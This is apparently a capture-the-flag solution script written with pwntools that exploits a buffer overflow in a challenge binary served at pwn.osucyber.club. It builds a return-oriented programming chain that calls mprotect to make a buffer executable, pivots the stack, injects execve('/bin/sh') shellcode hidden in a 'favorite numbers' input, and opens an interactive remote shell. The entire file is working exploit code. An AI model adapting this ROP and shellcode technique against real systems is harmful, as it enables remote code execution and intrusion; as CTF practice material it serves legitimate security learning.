#!/usr/bin/python3
from pwn import *
import time
import sys

context.arch = 'amd64'
context.terminal = ['termite', '-e']

dumbBuf = 0x00603000

xor_rdx = 0x040090f
inc_rdx = 0x0004008f7
# this address is wrong
other_buf = 0x00007fffffffde80
binary = ELF('pwn')
initial_chain = ROP(binary)

fav_number = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(0x80, b'A')
fav_color = b'B'*0x80
# unprotect other buff and try to execute from it
msg = b''
msg += p64(initial_chain.find_gadget(['pop rdi', 'ret']).address)
msg += p64(dumbBuf)
msg += p64(initial_chain.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
msg += p64(0x80)
msg += b'A'*8
msg += p64(xor_rdx)
msg += p64(inc_rdx)*7
msg += p64(binary.sym['mprotect'])
msg += p64(dumbBuf)
msg = msg.ljust(0x80, b'A')
# pivot stuff
msg += b'B'*8  # rbp
msg += p64(0x00000000004008db) # mov rsp, rsi
# msg += p64(initial_chain.find_gadget(['leave', 'ret']).address)

# sys.stdout.buffer.write(b'\n'.join([fav_number, fav_color, msg]))
# p = process(['./pwn'])
p = remote('pwn.osucyber.club', 13378)
# gdb.attach(p, """b *dumb+54
#            b *dumb+59
#            c""")
print(p.recvuntil(b'pls enter ur favorite numbers:'))
p.send(fav_number)
print(p.recvuntil(b'pls enter ur favorite colors:'))
p.send(fav_color)
print(p.recvuntil(b'program:'))
p.send(msg)
p.interactive()
# time.sleep(1)

# print(p.read().decode())



